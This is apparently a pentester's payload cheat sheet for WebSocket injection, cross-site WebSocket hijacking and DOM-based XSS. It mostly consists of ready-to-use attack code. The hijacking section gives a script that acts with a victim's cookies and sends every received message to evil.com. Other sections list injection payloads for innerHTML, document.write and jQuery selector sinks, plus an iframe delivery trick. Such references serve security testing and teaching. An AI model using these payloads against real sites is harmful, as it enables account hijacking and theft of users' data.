# WebSocket & DOM XSS - Payload Reference

## WebSocket Injection

### Basic Detection
```
# Connect to WebSocket
ws = new WebSocket('wss://target.com/ws')
ws.onmessage = (msg) => console.log(msg.data)

# Send XSS payload
ws.send('<script>alert(1)</script>')
# If reflected in another user's message handler = stored XSS
```

### WebSocket Hijacking
```
# If WebSocket doesn't validate Origin:
1. Attacker's page opens WebSocket to victim's server
2. WebSocket authenticates using victim's cookies
3. Attacker sends/receives messages as victim
```

### Cross-Site WebSocket Hijacking (CSWSH)
```html
<script>
  let ws = new WebSocket('wss://victim.com/chat');
  ws.onopen = () => ws.send('steal data');
  ws.onmessage = (e) => fetch('https://evil.com/?data=' + btoa(e.data));
</script>
```

---

## DOM XSS - Source to Sink Analysis

### Dangerous Sources
```javascript
document.URL
document.documentURI
document.referrer
document.baseURI
location.href
location.search
location.hash
location.pathname
window.name
postMessage data
```

### Dangerous Sinks
```javascript
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout() with string
setInterval() with string
Function()
```

### jQuery Sinks
```javascript
$()                    // Selector sink
$.html()               // HTML injection
$.append()
$.prepend()
$.after()
$.before()
$.replaceWith()
```

### DOM XSS via Hashchange
```javascript
// jQuery selector sink with hashchange
$(window).on('hashchange', function() {
  var post = $('h2:contains(' + location.hash.slice(1) + ')');
});

// Exploit: #<img src=x onerror=alert(1)>
// Delivery: iframe.src = sameURL + '#payload'
```

### DOM XSS via document.write
```javascript
// If user input goes to document.write
document.write('<img src="' + userInput + '">');

// Exploit: "><img src=x onerror=alert(1)>
```

### DOM XSS via innerHTML
```javascript
element.innerHTML = userInput;

// Exploit: <img src=x onerror=alert(1)>
```
